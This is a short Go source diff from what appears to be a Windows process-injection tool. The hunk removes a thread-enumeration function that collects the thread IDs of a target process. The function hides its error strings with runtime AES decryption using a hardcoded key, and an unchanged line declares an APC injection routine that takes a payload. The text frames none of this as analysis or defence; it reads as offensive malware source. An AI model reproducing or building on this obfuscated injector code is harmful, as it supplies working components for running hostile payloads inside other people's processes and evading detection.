@@ -2,42 +2,7 @@ package main
 
 import "os"
 import "fmt"
-import "syscall"
 import "unsafe"
-
-
-func GetThreads(pid uintptr) []uint32 {
-   var thread_ids_slice []uint32;
-   snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPTHREAD, 0)
-   if err != nil {
-      var cth32s_err_msg string = GetAESDecrypted_aux("+4hzQuCZKwp+TGshnZ4YYjEYg5LnbT+4YcLV65HDCuEEcxr/ClPfNIUe+Xb5WSw4", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
-      fmt.Println(cth32s_err_msg, err);
-   }
-
-   type ThreadEntry32 struct {
-      Size           uint32
-      tUsage         uint32
-      ThreadID       uint32
-      OwnerProcessID uint32
-      BasePri        int32
-      DeltaPri       int32
-      Flags          uint32
-   }
-
-   var te ThreadEntry32;
-   te.Size = uint32(unsafe.Sizeof(te));
-   T32F(uintptr(snapshot), uintptr(unsafe.Pointer(&te)));
- 
-   for{
-
-      if (T32N(uintptr(snapshot), uintptr(unsafe.Pointer(&te))) == 0) { break }
-      if (te.OwnerProcessID == uint32(pid)){
-         thread_ids_slice = append(thread_ids_slice, te.ThreadID)
-      }
-   }
-   CH(uintptr(snapshot));
-   return thread_ids_slice;
-}
 
 
 func QUAPC_Inj(process_name string, pid int, payload []byte) {
